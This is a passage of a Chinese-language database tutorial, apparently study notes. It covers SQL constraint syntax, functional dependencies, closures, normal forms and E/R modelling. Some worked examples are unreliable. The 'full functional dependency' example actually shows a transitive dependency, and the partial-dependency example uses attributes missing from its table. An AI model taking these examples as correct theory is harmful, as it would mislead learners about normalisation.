<li><p><strong>定义</strong>：外键约束确保数据之间的关联关系。</p>
</li>
<li><p><strong>SQL实现</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> orders (</span><br><span class="line">    order_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    employee_id <span class="type">INT</span>,</span><br><span class="line">    amount <span class="type">DECIMAL</span>(<span class="number">10</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (employee_id) <span class="keyword">REFERENCES</span> employees(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">FOREIGN</span> KEY (employee_id) <span class="keyword">REFERENCES</span> employees(id);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="唯一约束（Unique）"><a href="#唯一约束（Unique）" class="headerlink" title="唯一约束（Unique）"></a>唯一约束（Unique）</h4><p>唯一约束确保表中某一列或列组合的值是唯一的，但允许<code>NULL</code>值。</p>
<ul>
<li><p><strong>定义</strong>：唯一约束确保列值的唯一性。</p>
</li>
<li><p><strong>SQL实现</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    user_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> users</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (email);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="检查约束（Check）"><a href="#检查约束（Check）" class="headerlink" title="检查约束（Check）"></a>检查约束（Check）</h4><p>检查约束用于限制列中数据的范围或格式。</p>
<ul>
<li><p><strong>定义</strong>：检查约束确保列值满足特定条件。</p>
</li>
<li><p><strong>SQL实现</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    salary <span class="type">DECIMAL</span>(<span class="number">10</span>, <span class="number">2</span>) <span class="keyword">CHECK</span> (salary <span class="operator">&gt;</span> <span class="number">0</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CHECK</span> (salary <span class="operator">&gt;</span> <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="默认值约束（Default）"><a href="#默认值约束（Default）" class="headerlink" title="默认值约束（Default）"></a>默认值约束（Default）</h4><p>默认值约束为列指定一个默认值，当插入新行时，如果没有提供该列的值，则使用默认值。</p>
<ul>
<li><p><strong>定义</strong>：默认值约束为列提供默认值。</p>
</li>
<li><p><strong>SQL实现</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    user_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    created_at <span class="type">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> users</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> created_at <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="非空约束（Not-Null）"><a href="#非空约束（Not-Null）" class="headerlink" title="非空约束（Not Null）"></a>非空约束（Not Null）</h4><p>非空约束确保列的值不能为空。</p>
<ul>
<li><p><strong>定义</strong>：非空约束确保列值不为空。</p>
</li>
<li><p><strong>SQL实现</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    user_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> users</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> name <span class="keyword">SET</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h3><p>函数依赖是关系数据库理论中的核心概念之一，用于描述表中属性之间的关系。它定义了一个属性或属性组合如何唯一确定另一个属性的值。函数依赖是数据库规范化（Normalization）的基础，帮助设计者消除数据冗余和异常。</p>
<h4 id="1-函数依赖的定义"><a href="#1-函数依赖的定义" class="headerlink" title="1. 函数依赖的定义"></a>1. 函数依赖的定义</h4><p>设 <em>R</em> 是一个关系模式，<em>X</em> 和 <em>Y</em> 是 <em>R</em> 的属性集。如果对于 <em>R</em> 的每一个可能的关系 <em>r</em>，<em>r</em> 中任意两个元组 <em>t</em> 和 <em>s</em>，只要 <em>t</em>[<em>X</em>]&#x3D;<em>s</em>[<em>X</em>]，就有 <em>t</em>[<em>Y</em>]&#x3D;<em>s</em>[<em>Y</em>]，则称 <em>Y</em> 函数依赖于 <em>X</em>，记作 <em>X</em>→<em>Y</em>。</p>
<ul>
<li><strong>平凡函数依赖（Trivial FD）</strong>：如果 <em>Y</em>⊆<em>X</em>，则 <em>X</em>→<em>Y</em> 是平凡的。例如，{<em>A</em>,<em>B</em>}→<em>A</em> 是平凡的。</li>
<li><strong>非平凡函数依赖（Non-trivial FD）</strong>：如果 <em>Y</em>⊈<em>X</em>，则 <em>X</em>→<em>Y</em> 是非平凡的。例如，<em>A</em>→<em>B</em> 是非平凡的。</li>
</ul>
<h4 id="2-函数依赖的分类"><a href="#2-函数依赖的分类" class="headerlink" title="2. 函数依赖的分类"></a>2. 函数依赖的分类</h4><h5 id="2-1-完全函数依赖（Full-Functional-Dependency）"><a href="#2-1-完全函数依赖（Full-Functional-Dependency）" class="headerlink" title="2.1 完全函数依赖（Full Functional Dependency）"></a>2.1 完全函数依赖（Full Functional Dependency）</h5><p>如果 <em>X</em>→<em>Y</em>，并且对于 <em>X</em> 的任何一个真子集 <em>X</em>′，都有 <em>X</em>′↛<em>Y</em>，则称 <em>Y</em> 完全函数依赖于 <em>X</em>。</p>
<p><strong>示例</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> students (</span><br><span class="line">    student_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    major_id <span class="type">INT</span>,</span><br><span class="line">    major_name <span class="type">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>假设 <code>major_id → major_name</code>，并且 <code>student_id → major_id</code>，则 <code>student_id → major_name</code> 是完全函数依赖。</p>
<h5 id="2-2-部分函数依赖（Partial-Functional-Dependency）"><a href="#2-2-部分函数依赖（Partial-Functional-Dependency）" class="headerlink" title="2.2 部分函数依赖（Partial Functional Dependency）"></a>2.2 部分函数依赖（Partial Functional Dependency）</h5><p>如果 <em>X</em>→<em>Y</em>，但存在 <em>X</em> 的一个真子集 <em>X</em>′，使得 <em>X</em>′→<em>Y</em>，则称 <em>Y</em> 部分函数依赖于 <em>X</em>。</p>
<p><strong>示例</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> enrollments (</span><br><span class="line">    student_id <span class="type">INT</span>,</span><br><span class="line">    course_id <span class="type">INT</span>,</span><br><span class="line">    grade <span class="type">DECIMAL</span>(<span class="number">3</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (student_id, course_id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>假设 <code>student_id → name</code> 和 <code>course_id → instructor</code>，则 <code>student_id, course_id → name, instructor</code> 是部分函数依赖。</p>
<h5 id="2-3-传递函数依赖（Transitive-Functional-Dependency）"><a href="#2-3-传递函数依赖（Transitive-Functional-Dependency）" class="headerlink" title="2.3 传递函数依赖（Transitive Functional Dependency）"></a>2.3 传递函数依赖（Transitive Functional Dependency）</h5><p>如果 <em>X</em>→<em>Y</em>（非平凡），且 <em>Y</em>↛<em>X</em>，同时 <em>Y</em>→<em>Z</em>，则称 <em>Z</em> 传递函数依赖于 <em>X</em>。</p>
<p><strong>示例</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> departments (</span><br><span class="line">    dept_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    dept_name <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    manager_id <span class="type">INT</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>dept_id → dept_name</code> 和 <code>dept_name → manager_id</code>，则 <code>dept_id → manager_id</code> 是传递函数依赖。</p>
<h4 id="3-函数依赖的闭包"><a href="#3-函数依赖的闭包" class="headerlink" title="3. 函数依赖的闭包"></a>3. 函数依赖的闭包</h4><p>函数依赖的闭包（Closure）是指由一组函数依赖 <em>F</em> 推导出的所有函数依赖的集合。计算闭包是数据库规范化的重要步骤。</p>
<p><strong>计算闭包的算法</strong>：</p>
<ol>
<li>初始化 <em>X</em>+&#x3D;<em>X</em>。</li>
<li>遍历 <em>F</em> 中的每个函数依赖 <em>A</em>→<em>B</em>，如果 <em>A</em>⊆<em>X</em>+，则将 <em>B</em> 添加到 <em>X</em>+ 中。</li>
<li>重复步骤 2，直到 <em>X</em>+ 不再变化。</li>
</ol>
<p><strong>示例</strong>： 假设 <em>F</em>&#x3D;{<em>A</em>→<em>B</em>,<em>B</em>→<em>C</em>,<em>C</em>→<em>D</em>}，计算 <em>A</em>+：</p>
<ul>
<li>初始 <em>A</em>+&#x3D;{<em>A</em>}</li>
<li><em>A</em>→<em>B</em>，所以 <em>A</em>+&#x3D;{<em>A</em>,<em>B</em>}</li>
<li><em>B</em>→<em>C</em>，所以 <em>A</em>+&#x3D;{<em>A</em>,<em>B</em>,<em>C</em>}</li>
<li><em>C</em>→<em>D</em>，所以 <em>A</em>+&#x3D;{<em>A</em>,<em>B</em>,<em>C</em>,<em>D</em>}</li>
</ul>
<h4 id="4-候选键（Candidate-Key）"><a href="#4-候选键（Candidate-Key）" class="headerlink" title="4. 候选键（Candidate Key）"></a>4. 候选键（Candidate Key）</h4><p>候选键是关系模式中能够唯一标识元组的最小属性集。通过计算函数依赖的闭包，可以确定候选键。</p>
<p><strong>示例</strong>： 假设关系模式 <em>R</em>(<em>A</em>,<em>B</em>,<em>C</em>,<em>D</em>)，函数依赖集 <em>F</em>&#x3D;{<em>A</em>→<em>B</em>,<em>B</em>→<em>C</em>,<em>C</em>→<em>D</em>}：</p>
<ul>
<li><em>A</em>+&#x3D;{<em>A</em>,<em>B</em>,<em>C</em>,<em>D</em>}，因此 <em>A</em> 是候选键。</li>
</ul>
<h4 id="5-函数依赖与数据库规范化"><a href="#5-函数依赖与数据库规范化" class="headerlink" title="5. 函数依赖与数据库规范化"></a>5. 函数依赖与数据库规范化</h4><p>函数依赖是数据库规范化理论的基础。通过分析函数依赖，可以将关系模式分解为更简单的模式，从而消除数据冗余和操作异常。</p>
<p>在关系数据库设计中，<strong>范式（Normal Forms）</strong> 是用于减少数据冗余、提高数据一致性的核心理论。</p>
<h5 id="1-第一范式（1NF）"><a href="#1-第一范式（1NF）" class="headerlink" title="1. 第一范式（1NF）"></a><strong>1. 第一范式（1NF）</strong></h5><p><strong>核心要求</strong>：</p>
<ul>
<li>所有属性都是<strong>原子性</strong>的（不可再分的最小数据单元）。</li>
<li>每个列的值必须是单一值，不能包含重复组或多值。</li>
</ul>
<p><strong>解决的问题</strong>：</p>
<ul>
<li>消除重复的列和嵌套表结构。</li>
</ul>
<p><strong>示例</strong>：<br> 错误设计（非1NF）：</p>
<table>
<thead>
<tr>
<th align="center">学生ID</th>
<th align="center">课程</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1001</td>
<td align="center">数学, 物理</td>
</tr>
</tbody></table>
<p>（课程列包含多值）</p>
<p> 修正为1NF：</p>
<table>
<thead>
<tr>
<th align="center">学生ID</th>
<th align="center">课程</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1001</td>
<td align="center">数学</td>
</tr>
<tr>
<td align="center">1001</td>
<td align="center">物理</td>
</tr>
</tbody></table>
<h5 id="2-第二范式（2NF）"><a href="#2-第二范式（2NF）" class="headerlink" title="2. 第二范式（2NF）"></a><strong>2. 第二范式（2NF）</strong></h5><p><strong>前提</strong>：已满足1NF。<br>​<strong>​核心要求​</strong>​：</p>
<ul>
<li>消除<strong>部分函数依赖</strong>（非主属性完全依赖于候选键）。</li>
</ul>
<p><strong>解决的问题</strong>：</p>
<ul>
<li>当存在复合主键时，非主属性不能仅依赖部分主键。</li>
</ul>
<p><strong>示例</strong>：<br>错误设计（违反2NF）：<br>| 学生ID | 课程ID | 课程名称 | 成绩 |<br>（复合主键：学生ID + 课程ID，但“课程名称”仅依赖课程ID）</p>
<p>修正为2NF：</p>
<ul>
<li><strong>选课表</strong>（学生ID, 课程ID, 成绩）</li>
<li><strong>课程表</strong>（课程ID, 课程名称）</li>
</ul>
<h5 id="3-第三范式（3NF）"><a href="#3-第三范式（3NF）" class="headerlink" title="3. 第三范式（3NF）"></a><strong>3. 第三范式（3NF）</strong></h5><p><strong>前提</strong>：已满足2NF。<br>​<strong>​核心要求​</strong>​：</p>
<ul>
<li>消除<strong>传递函数依赖</strong>（非主属性不能依赖其他非主属性）。</li>
</ul>
<p><strong>解决的问题</strong>：</p>
<ul>
<li>确保非主属性直接依赖于候选键，而不是间接依赖。</li>
</ul>
<p><strong>示例</strong>：<br> 错误设计（违反3NF）：<br>| 员工ID | 部门 | 部门经理 |<br>（假设：员工ID → 部门，部门 → 部门经理）</p>
<p> 修正为3NF：</p>
<ul>
<li><strong>员工表</strong>（员工ID, 部门）</li>
<li><strong>部门表</strong>（部门, 部门经理）</li>
</ul>
<h5 id="Boyce-Codd范式（BCNF）"><a href="#Boyce-Codd范式（BCNF）" class="headerlink" title="Boyce-Codd范式（BCNF）"></a><strong>Boyce-Codd范式（BCNF）</strong></h5><p><strong>前提</strong>：已满足3NF。<br>​<strong>​核心要求​</strong>​：</p>
<ul>
<li>所有函数依赖的<strong>决定因素</strong>（左侧）必须是<strong>候选键</strong>（超键）。<br>（即，如果存在X → Y，X必须是候选键）</li>
</ul>
<p><strong>解决的问题</strong>：</p>
<ul>
<li>消除主属性对非主属性的依赖（3NF未完全解决的特殊情况）。</li>
</ul>
<p><strong>示例</strong>：<br> 错误设计（满足3NF但违反BCNF）：<br>| 学生ID | 课程 | 教室 |<br>假设：每个教室只上一门课程，课程 → 教室，但课程不是候选键。</p>
<p> 修正为BCNF：</p>
<ul>
<li><strong>选课表</strong>（学生ID, 课程）</li>
<li><strong>课程教室表</strong>（课程, 教室）</li>
</ul>
<h5 id="第四范式（4NF）"><a href="#第四范式（4NF）" class="headerlink" title="第四范式（4NF）"></a><strong>第四范式（4NF）</strong></h5><p><strong>前提</strong>：已满足BCNF。<br>​<strong>​核心要求​</strong>​：</p>
<ul>
<li>消除<strong>多值依赖</strong>（Multi-Valued Dependency, MVD）。<br>（即，若存在X →→ Y，则X是超键，或Y是X的子集）</li>
</ul>
<p><strong>解决的问题</strong>：</p>
<ul>
<li>处理多个独立的多值属性共存的情况。</li>
</ul>
<p><strong>示例</strong>：<br> 错误设计（违反4NF）：<br>| 员工ID | 技能 | 语言 |<br>（技能和语言是独立的多值属性）</p>
<p> 修正为4NF：</p>
<ul>
<li><strong>员工技能表</strong>（员工ID, 技能）</li>
<li><strong>员工语言表</strong>（员工ID, 语言）</li>
</ul>
<h5 id="第五范式（5NF）-投影-连接范式（PJNF）"><a href="#第五范式（5NF）-投影-连接范式（PJNF）" class="headerlink" title="第五范式（5NF）&#x2F; 投影-连接范式（PJNF）"></a><strong>第五范式（5NF）&#x2F; 投影-连接范式（PJNF）</strong></h5><p><strong>前提</strong>：已满足4NF。<br>​<strong>​核心要求​</strong>​：</p>
<ul>
<li>消除<strong>连接依赖</strong>（Join Dependency），即表必须能无损分解为多个子表，且通过自然连接恢复原表。</li>
</ul>
<p><strong>解决的问题</strong>：</p>
<ul>
<li>处理复杂场景中无法通过单一分解消除冗余的情况。</li>
</ul>
<p><strong>示例</strong>：<br> 错误设计（违反5NF）：<br>| 供应商 | 零件 | 项目 |<br>假设供应商可为多个项目供应多种零件，需通过三张两两关联的表分解。</p>
<h5 id="范式总结"><a href="#范式总结" class="headerlink" title="范式总结"></a><strong>范式总结</strong></h5><table>
<thead>
<tr>
<th align="center">范式</th>
<th align="center">核心规则</th>
<th align="center">解决的问题</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1NF</td>
<td align="center">属性原子性</td>
<td align="center">多值、重复组</td>
</tr>
<tr>
<td align="center">2NF</td>
<td align="center">消除部分依赖</td>
<td align="center">非主属性对部分主键的依赖</td>
</tr>
<tr>
<td align="center">3NF</td>
<td align="center">消除传递依赖</td>
<td align="center">非主属性间的间接依赖</td>
</tr>
<tr>
<td align="center">BCNF</td>
<td align="center">所有依赖的决定因素是候选键</td>
<td align="center">主属性对非主属性的依赖</td>
</tr>
<tr>
<td align="center">4NF</td>
<td align="center">消除多值依赖</td>
<td align="center">独立多值属性共存</td>
</tr>
<tr>
<td align="center">5NF</td>
<td align="center">消除连接依赖</td>
<td align="center">复杂冗余场景</td>
</tr>
</tbody></table>
<h4 id="6-函数依赖的实际应用"><a href="#6-函数依赖的实际应用" class="headerlink" title="6. 函数依赖的实际应用"></a>6. 函数依赖的实际应用</h4><p>在SQL中，函数依赖可以通过约束（如主键、唯一键、外键）来体现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees (</span><br><span class="line">    employee_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,  <span class="comment">-- employee_id → name, department</span></span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    department_id <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (department_id) <span class="keyword">REFERENCES</span> departments(dept_id)  <span class="comment">-- department_id → dept_name</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h1 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h1><h3 id="高级数据库模型（E-R模型）"><a href="#高级数据库模型（E-R模型）" class="headerlink" title="高级数据库模型（E&#x2F;R模型）"></a>高级数据库模型（E&#x2F;R模型）</h3><h4 id="1-E-R模型基础"><a href="#1-E-R模型基础" class="headerlink" title="1. E&#x2F;R模型基础"></a>1. <strong>E&#x2F;R模型基础</strong></h4><ul>
<li><strong>实体集（Entity Set）</strong>：表示同类实体的集合，用矩形表示。例如，<code>学生</code>实体集包含所有学生的信息。</li>
<li><strong>属性（Attribute）</strong>：描述实体的特征，用椭圆表示。主键属性带下划线，如学生的<code>学号</code>。</li>
<li><strong>联系（Relationship）</strong>：连接实体集的关联，用菱形表示。例如，<code>选课</code>联系连接<code>学生</code>和<code>课程</code>实体集。</li>
</ul>
<h4 id="2-二元联系的多样性"><a href="#2-二元联系的多样性" class="headerlink" title="2. 二元联系的多样性"></a>2. <strong>二元联系的多样性</strong></h4><ul>
<li><strong>一对一（1:1）</strong>：双方实体最多关联一个对方实体。例如，<code>员工</code>与<code>工位</code>的联系（每个员工一个工位，反之亦然），箭头双向指向。</li>
<li><strong>一对多（1:N）</strong>：例如，<code>部门</code>与<code>员工</code>的联系（一个部门有多个员工），箭头指向<code>员工</code>（多对一）。</li>
<li><strong>多对多（M:N）</strong>：例如，<code>学生</code>与<code>课程</code>的选课联系，无箭头。</li>
</ul>
<h4 id="3-多路联系与角色"><a href="#3-多路联系与角色" class="headerlink" title="3. 多路联系与角色"></a>3. <strong>多路联系与角色</strong></h4><ul>
<li><strong>多路联系</strong>：涉及多个实体集的联系。例如，<code>合同</code>联系涉及<code>影星</code>、<code>电影</code>和<code>电影公司</code>，表示某影星在特定电影中只签约一家公司。</li>
<li><strong>角色</strong>：同一实体集在不同联系中扮演不同角色。例如，<code>员工</code>在<code>管理</code>联系中可同时作为“经理”和“下属”。</li>
</ul>
<h4 id="4-联系的属性"><a href="#4-联系的属性" class="headerlink" title="4. 联系的属性"></a>4. <strong>联系的属性</strong></h4><ul>
<li>联系可拥有属性。例如，<code>选课</code>联系的<code>成绩</code>属性。若属性复杂，可创建新实体集（如<code>注册记录</code>）。</li>
</ul>
<h4 id="5-子类（ISA联系）"><a href="#5-子类（ISA联系）" class="headerlink" title="5. 子类（ISA联系）"></a>5. <strong>子类（ISA联系）</strong></h4><ul>
<li>子类继承父类的属性和联系，用三角形表示。例如，<code>员工</code>的子类<code>小时工</code>（有<code>小时工资</code>）和<code>正式员工</code>（有<code>月薪</code>）。</li>
</ul>
<h4 id="6-设计原则"><a href="#6-设计原则" class="headerlink" title="6. 设计原则"></a>6. <strong>设计原则</strong></h4><ul>
<li><strong>忠实性</strong>：模型需准确反映现实需求。例如，若学生可选多门课程，联系必须为多对多。</li>
<li><strong>避免冗余</strong>：不重复存储数据。例如，不应在<code>学生</code>表中重复存储课程信息。</li>
<li><strong>简单性</strong>：避免过度复杂。例如，若实体集间存在多个相似联系，考虑合并。</li>
</ul>
<h4 id="7-E-R模型中的约束"><a href="#7-E-R模型中的约束" class="headerlink" title="7. E&#x2F;R模型中的约束"></a>7. <strong>E&#x2F;R模型中的约束</strong></h4><ul>
<li><strong>键约束</strong>：主键唯一标识实体。例如，<code>学号</code>是<code>学生</code>的主键。</li>
<li><strong>参照完整性</strong>：箭头表示存在依赖。例如，<code>订单</code>必须指向存在的<code>客户</code>。</li>
<li><strong>度约束</strong>：限制参与联系的数量。例如，<code>项目</code>最多由3个<code>部门</code>负责。</li>
</ul>
<h4 id="8-弱实体集"><a href="#8-弱实体集" class="headerlink" title="8. 弱实体集"></a>8. <strong>弱实体集</strong></h4><ul>
<li>依赖其他实体集存在的实体，主键包含父实体集的主键。例如，<code>订单项</code>的主键为<code>订单ID</code>（来自<code>订单</code>）和<code>项编号</code>。</li>
</ul>
<h4 id="9-从E-R图到关系设计"><a href="#9-从E-R图到关系设计" class="headerlink" title="9. 从E&#x2F;R图到关系设计"></a>9. <strong>从E&#x2F;R图到关系设计</strong></h4><ul>
<li><strong>实体集转换</strong>：每个实体集转为表，属性为列。例如，<code>学生</code>表包含<code>学号</code>（主键）、<code>姓名</code>等。</li>
<li>联系转换：<ul>
<li><strong>多对多</strong>：单独建表，包含双方主键及联系属性。例如，<code>选课</code>表含<code>学号</code>、<code>课程号</code>和<code>成绩</code>。</li>
<li><strong>多对一&#x2F;一对一</strong>：将外键置于“多”方表中。例如，<code>员工</code>表中添加<code>部门ID</code>作为外键。</li>
</ul>
</li>
<li><strong>弱实体集处理</strong>：合并父实体主键。例如，<code>订单项</code>表的主键为<code>订单ID</code>和<code>项编号</code>，外键引用<code>订单</code>表。</li>
<li>子类处理：<ul>
<li><strong>方案1</strong>：父表和子表分开，子表含父表主键。如<code>员工</code>表和<code>小时工</code>表（含<code>员工ID</code>和<code>小时工资</code>）。</li>
<li><strong>方案2</strong>：合并所有属性到父表，用类型字段区分。例如，<code>员工</code>表含<code>员工类型</code>字段，<code>小时工资</code>和<code>月薪</code>允许NULL。</li>
</ul>
</li>
</ul>
<h4 id="10-示例：电影合同系统"><a href="#10-示例：电影合同系统" class="headerlink" title="10. 示例：电影合同系统"></a>10. <strong>示例：电影合同系统</strong></h4><ul>
<li><strong>E&#x2F;R图</strong>：<code>影星</code>、<code>电影</code>、<code>电影公司</code>通过<code>合同</code>联系（三元联系）。</li>
<li>关系模式：<ul>
<li><code>影星(影星ID, 姓名)</code></li>
<li><code>电影(电影ID, 片名)</code></li>
<li><code>电影公司(公司ID, 名称)</code></li>
<li><code>合同(影星ID, 电影ID, 公司ID, 签约日期)</code><br>（主键为<code>影星ID</code>和<code>电影ID</code>，确保每影星每电影唯一签约）</li>
</ul>
</li>
</ul>
<h4 id="11-关键注意事项"><a href="#11-关键注意事项" class="headerlink" title="11. 关键注意事项"></a>11. <strong>关键注意事项</strong></h4><ul>
<li><strong>外键约束</strong>：确保数据完整性。例如，<code>订单项</code>的<code>订单ID</code>必须存在于<code>订单</code>表。</li>
<li><strong>冗余检查</strong>：避免在多表中重复相同数据，如不分别在<code>员工</code>和<code>部门</code>表中存储部门名称。</li>
<li><strong>性能优化</strong>：合理选择是否将联系合并到实体表中（如多对一联系可减少表连接操作）。</li>
</ul>
<h3 id="约束与触发器"><a href="#约束与触发器" class="headerlink" title="约束与触发器"></a>约束与触发器</h3><h4 id="一、约束（Constraints）"><a href="#一、约束（Constraints）" class="headerlink" title="一、约束（Constraints）"></a>一、约束（Constraints）</h4><p>约束是数据库管理系统（DBMS）强制实施的数据规则，用于维护数据完整性。</p>
<h5 id="1-键约束（Key-Constraints）"><a href="#1-键约束（Key-Constraints）" class="headerlink" title="1. 键约束（Key Constraints）"></a>1. 键约束（Key Constraints）</h5><ul>
<li><p><strong>主键（PRIMARY KEY）</strong><br>唯一标识元组，不允许空值（NOT NULL）。</p>
<p>语法示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student (</span><br><span class="line">  id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  name <span class="type">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>唯一键（UNIQUE）</strong><br>允许空值，但非空值必须唯一。<br>与主键区别：一个表只能有一个主键，可以有多个唯一键。</p>
</li>
</ul>
